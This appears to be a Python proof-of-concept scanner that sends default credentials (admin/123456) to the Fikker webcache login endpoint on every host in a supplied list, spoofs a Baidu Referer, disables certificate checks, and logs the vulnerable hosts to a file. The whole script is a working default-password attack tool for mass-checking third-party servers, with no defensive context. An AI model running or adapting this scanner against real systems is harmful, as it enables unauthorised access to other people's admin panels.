import requests
import sys

def check(i):
    poc = r"""/fikker/webcache.fik?type=sign&cmd=in"""
    headers = {
        "Referer": "http://www.baidu.com/"
    }
    data = r"RequestID=LOGIN&Username=admin&Password=123456"
    try:
        res = requests.post(i + poc, headers=headers, data=data, verify=False, timeout=3)
        if "True" in res.text:
            print("\033[0;32;40m[+] {} 疑似存在fikker-weak-password漏洞 默认密码:123456！！！\033[0m".format(i))
            f = open("res.txt", "a+", encoding="utf-8")
            f.write(i)
            f.write("\n")
            f.close()
        else:
            print("\033[0;31;40m[-] {} 未发现fikker-weak-password漏洞\033[0m".format(i))
    except Exception as e:
        print("url:{}请求失败".format(i))




file_path = sys.argv[2]
file = open(file_path,"r").read().split()

for i in file:
    if "http://" not in i:
        i = "http://" + i
    check(i)
